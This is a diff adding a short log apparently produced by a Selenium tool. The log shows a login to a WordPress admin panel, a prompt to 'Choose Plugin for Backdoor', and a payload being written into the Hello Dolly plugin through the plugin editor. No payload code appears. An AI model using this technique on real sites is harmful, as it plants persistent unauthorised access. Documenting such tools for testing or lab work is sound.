@@ -1,0 +1,15 @@
+
+| Start Selenium Script
+[2022-06-13 13:19:42,113] [INFO    ] [Login with user: sele]
+[2022-06-13 13:19:47,363] [INFO    ] [Start Edit Plugin]
+
+| Choose Plugin for Backdoor
+[0] - Akismet Anti-Spam
+[1] - Anonymous Restricted Content
+[2] - Disable XML-RPC
+[3] - FakerPress
+[4] - Hello Dolly
+[5] - Inline Spoilers
+Plugin Nummber: [2022-06-13 13:19:53,239] [INFO    ] [Current Url: http://wordpress/wp-admin/plugin-editor.php?plugin=hello-dolly/hello.php&Submit=Select]
+[2022-06-13 13:19:53,243] [INFO    ] [Write Payload in Plugin:hello-dolly with File:hello.php]
+####
